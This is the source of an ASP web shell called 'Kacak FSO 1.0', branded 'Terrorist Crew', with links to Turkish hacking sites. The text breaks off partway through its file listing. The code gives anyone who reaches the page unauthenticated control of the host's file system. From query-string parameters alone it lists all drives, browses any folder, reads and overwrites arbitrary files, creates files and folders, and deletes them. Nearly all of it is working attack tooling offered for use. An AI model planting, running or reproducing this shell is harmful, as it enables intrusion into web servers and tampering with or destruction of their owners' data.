<html>
<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>Kacak FSO 1.0 | Terrorist Crew - Saldiri.Org</title>
</head>

<body topmargin="0" leftmargin="0" bgcolor="#EAEAEA">

<script language="JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
//-->
</script>

<%
if request.querystring("TGH") = "1" then
on error resume next
es=request.querystring("Kacak")
diez=server.urlencode(left(es,(instrRev(es,"\"))-1))

Select case es
case "C:" diez="C:"
case "D:" diez="D:"
end select




%>





<body topmargin="0" leftmargin="0"
onLoad="location.href='?klas=<%=diez%>&usak=1'">

<%
else
%>



<%
if request.querystring("Dosyakaydet") <> "" then
set kaydospos=createobject("scripting.filesystemobject")
set	kaydoses=kaydospos.createtextfile(request.querystring("dosyakaydet") & request("dosadi"))
set kaydoses=nothing
set kaydospos=nothing
set kaydospos=createobject("scripting.filesystemobject")
set kaydoses=kaydospos.opentextfile(request.querystring("dosyakaydet") & request("dosadi"), 2, true)
kaydoses.write request("duzenx")
set kaydoses=nothing
set kaydospos=nothing
end if
%>





<%
if request.querystring("yenidosya") <> "" then
%>

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    Kacak ©<br>
    </span>Terrorist Crew<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
    <font color="#858585">GrayHatz ~ TurkGuvenligi.İnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hotmail.com" style="text-decoration: none"><font color="#858585">@GrayHatz ~ TurkGuvenligi.İnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalışılan Klasör</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(request.querystring("yenidosya"))%></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#B7B7B7">
    <form method="POST" action="?dosyakaydet=<%=request.querystring("yenidosya")%>&klas=<%=request.querystring("yenidosya")%>" name="kaypos">
<p align="center"><b><font size="1" face="Verdana">
<br>
Dosya Adı : <br>
                </font>
	</b><font
                color="#FFFFFF" size="1" face="Arial">
<input
                type="text" size="97" maxlength="32"
                name="dosadi" value="Dosya Adı"
                class="search"
                onblur="if (this.value == '') this.value = 'Kullanıcı'"
                onfocus="if (this.value == 'Kullanıcı') this.value=''"
                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"><br>
<br>
                </font>
	<b><font size="1" face="Verdana">
İçerik :&nbsp; <br>
                </font>
	<font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
          <textarea name="duzenx" 
          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
        
          
          rows="24" cols="95" wrap="OFF"><%=sedx%></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
<br>
</font></b>
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Oluştur"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></p>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber19">
  <tr>
    <td width="100%" align="right" bgcolor="#000000">
    <p align="center">
	&nbsp;</td>
  </tr>
</table>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#EAEAEA">
    <p align="right">
	&nbsp;</td>
  </tr>
</table>



<%
else
%>







<%
if request.querystring("klasorac") <> "" then

set doses=createobject("scripting.filesystemobject")
set es=doses.createfolder(request.querystring("aktifklas") & request("duzenx"))
set es=nothing
set doses=nothing


end if
%>

<%
if request.querystring("klasac") <> "" then

set aktifklas=request.querystring("aktifklas")


%>
    <td width="65" bgcolor="#000000" height="76">

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber25" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    <center>Kacak ©<br>
    </span>Terrorist Crew<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
    <font color="#858585">GrayHatz ~ TurkGuvenligi.İnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  </table>


    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalışılan Alan</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=aktifklas%></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="174">
  <tr>
    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#C5C5C5" height="134">
    <form method="POST" action="?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" name="klaspos">
<p align="center"><font
                color="#FFFFFF" size="1" face="Arial">
<input
                type="text" size="37" maxlength="32"
                name="duzenx" value="Klasör Adı"
                class="search"
                onblur="if (this.value == '') this.value = 'Kullanıcı'"
                onfocus="if (this.value == 'Kullanıcı') this.value=''"
                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center">&nbsp;&nbsp;
<br>
<br>
<br>
                </font>
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Oluştur"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></span><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
&nbsp;</font></td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
  </tr>
  <tr>


<%
else
%>



<%
if request.querystring("suruculer") <> "" then
%>

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    Kacak ©<br>
    </span>Terrorist Crew<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
    <font color="#858585">www.kacaq.blogspot.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="4">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="4">
        <span style="font-size: 2pt">&nbsp;</span></td>
      </tr>
    </table>
    </td>
  </tr>
</table>


<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="153">
  <tr>
    <td width="100%" height="19" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" height="113" bgcolor="#E1E1E1">&nbsp;<div align="center">
      <center>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber2" height="17">
        <tr>
          <td width="208" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Sürücü Adı</font></td>
          <td width="75" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Boyutu</font></td>
          <td width="75" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Boş Alan</font></td>
          <td width="64" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Durum</font></td>
          <td width="62" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">İşlem</font></td>
        </tr>
      </table>
      </center>
    </div>
    <div align="center">
      <center>


	<%
	set klassis =server.createobject("scripting.filesystemobject")
	set klasdri=klassis.drives
	%>
	
	<%
	for each dongu in klasdri
	%>
			
	<%
	if dongu.driveletter <> "A" then
	if dongu.isready=true then
	%>

	<%
	select case dongu.drivetype
	case 0 teype="Diğer"
	case 1 teype="Taşınır"
	case 2 teype="HDD"
	case 3 teype="NetWork"
	case 4 teype="CD-Rom"
	case 5 teype="FlashMem"
	end select
	%>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber3" height="17">
        <tr>
          <td width="208" height="17" align="left" bgcolor="#EEEEEE">
          <font face="Verdana" style="font-size: 8pt">&nbsp;<%=dongu.driveletter%>:\ ( <%=dongu.filesystem%> )</font></td>
          <td width="75" height="17" align="center" bgcolor="#E0E0E0">
          <font face="Verdana" style="font-size: 8pt"><%=Round(dongu.totalsize/(1024*1024),1)%> MB</font></td>
          <td width="75" height="17" align="center" bgcolor="#E0E0E0">
          <font face="Verdana" style="font-size: 8pt"><%=Round(dongu.availablespace/(1024*1024),1)%> MB</font></td>
          <td width="64" height="17" align="center" bgcolor="#E0E0E0">
          <font face="Verdana" style="font-size: 8pt"><%=teype%>&nbsp;</font></td>
          <td width="62" height="17" align="center" bgcolor="#E0E0E0">
          <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber24">
            <tr>
          <td width="62" height="17" align="center" bgcolor="#E0E0E0"
          onmouseover="this.style.background='#A0A0A0'"
          onmouseout="this.style.background='#E0E0E0'"
          style="CURSOR: hand"
          
          >
          <a href="?klas=<%=dongu.driveletter%>:\" style="text-decoration: none">
          <font face="Verdana" style="font-size: 8pt" color="#000000">Gir</font></a></td>
            </tr>
          </table>
          </td>
        </tr>
      </table>

	<%
	end if
	end if
	%>
<%
next
%>



      </center>
    </div>
    <div align="center">
      <center>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber4" height="4">
        <tr>
          <td width="484" height="4" align="center" bgcolor="#C5C5C5">
          <span style="font-size: 2pt">&nbsp;</span></td>
        </tr>
      </table>
      </center>
    </div>
    <p>&nbsp;</p>
    </td>
  </tr>
  <tr>
    <td width="100%" height="19" bgcolor="#000000">&nbsp;</td>
  </tr>
</table>





<%
else
%>





<%
if request.querystring("kaydet") <> "" then
set dossisx=server.createobject("scripting.filesystemobject")
set dosx=dossisx.opentextfile(request.querystring("kaydet"), 2, true)
dosx.write request("duzenx")
dosx.close
set dosyax=nothing
set dossisx=nothing

end if
%>




<%
if request.querystring("duzenle") <> "" then
set dossis=server.createobject("scripting.filesystemobject")
set dos=dossis.opentextfile(request.querystring("duzenle"), 1)
sedx = dos.readall
dos.close
set dosya=nothing
set dossis=nothing

set aktifklas=request.querystring("klas")
%>




<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    Kacak©<br>
    </span>Terrorist Crew<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
    <font color="#858585">www.kacaq.blogspot.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalışılan Dosya</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(request.querystring("duzenle"))%></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000">
    <form method="POST" action="?kaydet=<%=request.querystring("duzenle")%>&klas=<%=aktifklas%>" name="kaypos">
<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
          <textarea name="duzenx" 
          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
        
          
          rows="24" cols="163" wrap="OFF"><%=sedx%></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
&nbsp;</font></b></p>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber19">
  <tr>
    <td width="100%" align="right">
    <p align="center">
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Kaydet"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span><a href=""><input type="reset" size="16"
		name="x" value="Vazgeç"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></a></td>
  </tr>
</table>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#EAEAEA">
    <p align="right">
	&nbsp;</td>
  </tr>
</table>



<%
else
%>


<%

if request.querystring("klas") <> "" then
aktifklas=Request.querystring("klas")
if request.querystring("usak") = "1" then
aktifklas=aktifklas & "\"
end if

else
aktifklas=server.mappath("/")
aktifklas=aktifklas & "\"
end if

if request.querystring("silklas") <> "" then
set sis=createobject("scripting.filesystemobject")
silincekklas=request.querystring("silklas")
sis.deletefolder(silincekklas)
set sis=nothing
'response.write(sil & "  Silindi")
end if

if request.querystring("sildos") <> "" then
silincekdos=request.querystring("sildos")
set dosx=createobject("scripting.filesystemobject")
set dos=dosx.getfile(silincekdos)
dos.delete
set dos=nothing
set dosyasis=nothing
end if




select case aktifklas
case "C:" aktifklas="C:\"
case "D:" aktifklas="D:\"
case "E:" aktifklas="E:\"
case "F:" aktifklas="F:\"
case "G:" aktifklas="G:\"
case "H:" aktifklas="H:\"
case "I:" aktifklas="I:\"
case "J:" aktifklas="J:\"
case "K:" aktifklas="K:\"
end select



if aktifklas=("C:") then aktifklas=("C:\")

Set FS = CreateObject("Scripting.FileSystemObject")
Set klasor = FS.GetFolder(aktifklas)
Set altklasorler = klasor.SubFolders
Set dosyalar = klasor.files
%>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    Kacak ©<br><br>
    </span>Terrorist Crew<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
    <font color="#858585">www.kacaq.blogspot.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalışılan Klasör</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(aktifklas)%></font></td>
            <td width="65">
            <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" height="13">
              <tr>
                <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13">
                <p align="center"><font face="Verdana" style="font-size: 8pt">

                <a href="?usklas=1&klas=<%=server.urlencode(left(aktifklas,(instrRev(aktifklas,"\"))-1))%>" style="text-decoration: none">
                <font color="#000000">Üst Klasör</font></a></font></td>
                
              </tr>
            </table>
            </td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="21">
  <tr>
    <td width="625" bgcolor="#000000"><span style="font-size: 2pt">&nbsp;</span></td>
  </tr>
  <tr>
    <td bgcolor="#000000" height="20">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#000000" id="AutoNumber23" bgcolor="#A3A3A3" width="373" height="19">
      <tr>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber26">
          <tr>
        <td align="center" bgcolor="#5F5F5F" 
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
        
        height="19" bordercolor="#000000">
        <span style="font-weight: 700">
        <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
        <a href="?suruculer=1" style="text-decoration: none">
        <font color="#9F9F9F">Sürücüler</font></a></font></span></td>
          </tr>
        </table>
        </td>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber27">
          <tr>
        <td align="center" bgcolor="#5F5F5F" height="19" 
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
        bordercolor="#000000">
        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
        <a href="?klasac=1&aktifklas=<%=aktifklas%>" style="text-decoration: none">
        <font color="#9F9F9F">Yeni Klasör</font></a></font></td>
          </tr>
        </table>
        </td>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber28">
          <tr>
        <td align="center" bgcolor="#5F5F5F" height="19"
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
		bordercolor="#000000">
        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
        <a href="?yenidosya=<%=aktifklas%>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
  </table>


			
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
  <tr>
    <td width="30" height="17" bgcolor="#9F9F9F">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Tür</font></td>
    <td height="17" bgcolor="#9F9F9F">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Dosya 
    Adı</font></td>
    <td width="122" height="17" bgcolor="#9F9F9F">
    <p align="center">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;İşlem</font></td>
  </tr>
</table>



<% For each oge in altklasorler %> 


<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="17">
  <tr>
    <td width="30" height="17" bgcolor="#808080">
    <p align="center">
    <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
    <td height="17" bgcolor="#C4C4C4">
    <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%>&nbsp;</font></td>
    <td width="61" height="17" bgcolor="#C4C4C4" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15" height="20">
      <tr>
        <td width="100%" bgcolor="#A3A3A3"
        onmouseover="this.style.background='#BBBBBB'"
        onmouseout="this.style.background='#A3A3A3'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="?klas=<%=aktifklas%><%=oge.name%>\" style="text-decoration: none">
        <font color="#000000">Aç</font></a></font></td>
      </tr>
    </table>
    </td>
    <td width="60" height="17" bgcolor="#C4C4C4" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18" height="20">
      <tr>
        <td width="100%" bgcolor="#A3A3A3"
        onmouseover="this.style.background='#BBBBBB'"
        onmouseout="this.style.background='#A3A3A3'"


        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="?silklas=<%=aktifklas & oge.name & "&klas=" & aktifklas %>" style="text-decoration: none">
        <font color="#000000">Sil</font></a>

        </font></td>
      </tr>
    </table>
    </td>
  </tr>
</table>

<% Next %>
			    

<% For each oge in dosyalar %> 

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
  <tr>
    <td width="30" height="1" bgcolor="#B0B0B0">
    <p align="center">
    <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
    <td height="1" bgcolor="#EAEAEA">
    <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%> </font>
    <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( <%=Round(oge.size/1024,1)%> KB )&nbsp;</font></td>
    <td width="61" height="1" bgcolor="#D6D6D6" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12" height="20">
      <tr>
        <td width="100%" bgcolor="#D6D6D6" no wrap
        onmouseover="this.style.background='#ACACAC'"
        onmouseout="this.style.background='#D6D6D6'"
        style="CURSOR: hand"
		height="20">

